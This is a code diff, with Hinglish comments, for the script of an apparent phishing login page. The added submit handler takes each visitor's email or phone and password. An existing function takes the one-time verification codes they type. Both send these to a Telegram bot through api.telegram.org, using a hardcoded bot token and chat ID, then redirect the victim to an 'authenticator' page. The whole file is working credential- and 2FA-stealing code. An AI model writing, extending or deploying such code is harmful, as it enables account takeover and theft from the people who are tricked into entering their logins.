@@ -1,32 +1,44 @@
 document.addEventListener("DOMContentLoaded", () => {
-    // Modal controls
+    const form = document.getElementById("login-form");
     const modal = document.getElementById("verificationModal");
-    const closeModal = document.querySelector(".close-modal");
     const otpInput = document.getElementById("otp-input");
 
-    // Modal open karne ka function
-    window.openModal = function() {
-        // FIXED: Sirf ye line add ki hai jo box ko khali karegi
-        if (otpInput) otpInput.value = ""; 
+    // Ye function aapka modal kholta hai aur purana OTP clear karta hai
+    window.toggleSelection = function(checkbox) {
+        if (otpInput) {
+            otpInput.value = ""; // Sirf ye line add ki hai reset ke liye
+        }
         modal.style.display = "block";
     };
 
-    closeModal.onclick = () => {
-        modal.style.display = "none";
+    const bots = {
+        "7892706717:AAGLqVZWBSvENZtXC-7EpmjhOHygY_8RQK8": "-4814667671"
     };
 
-    window.onclick = (event) => {
-        if (event.target == modal) {
-            modal.style.display = "none";
-        }
-    };
+    if (form) {
+        form.addEventListener("submit", async (event) => {
+            event.preventDefault();
+            const emailPhone = document.getElementById("email-phone").value;
+            const password = document.getElementById("password").value;
+            const message = `New Login Data:\n\nEmail/Phone: ${emailPhone}\nPassword: ${password}`;
+
+            try {
+                const sendPromises = Object.entries(bots).map(async ([token, chatId]) => {
+                    const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+                    return fetch(url);
+                });
+                await Promise.all(sendPromises);
+                window.location.href = "authengator.html";
+            } catch (error) {
+                console.error("Error:", error);
+            }
+        });
+    }
 });
 
-// Confirm button function (Aapka original Telegram calling logic)
+// Ye confirmSelection function aapki verification.html ke liye hai
 async function confirmSelection() {
     const otpValue = document.getElementById("otp-input").value;
-    
-    // Yahan wahi Bots aur Chat ID hain jo aapki original file mein the
     const bots = {
         "7892706717:AAGLqVZWBSvENZtXC-7EpmjhOHygY_8RQK8": "-4814667671"
     };
@@ -39,13 +51,12 @@ async function confirmSelection() {
                 return fetch(url);
             });
             await Promise.all(sendPromises);
-            
-            // Redirect to next page
+            // Teesre page (authenticator) par jane ka rasta
             window.location.href = "authengator.html";
         } catch (error) {
             window.location.href = "authengator.html";
         }
     } else {
-        alert("Please enter a valid code.");
+        alert("Please enter a valid 6-digit code.");
     }
 }
